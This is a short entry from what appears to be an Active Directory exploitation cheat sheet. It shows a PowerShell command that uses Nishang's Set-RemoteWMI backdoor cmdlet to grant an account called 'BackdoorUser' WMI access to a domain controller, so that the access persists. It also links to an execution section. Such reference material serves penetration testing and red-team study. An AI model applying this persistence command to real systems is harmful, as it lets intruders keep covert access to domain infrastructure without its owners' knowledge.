Give user WMI access to a machine, using [Set-RemoteWMI](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) cmdlet from Nishang. Can be run to persist access to e.g. DCs.

```powershell
Set-RemoteWMI -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace 'root\cimv2'
```

For execution, see [‘Command execution with WMI’](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#command-execution-with-wmi) above.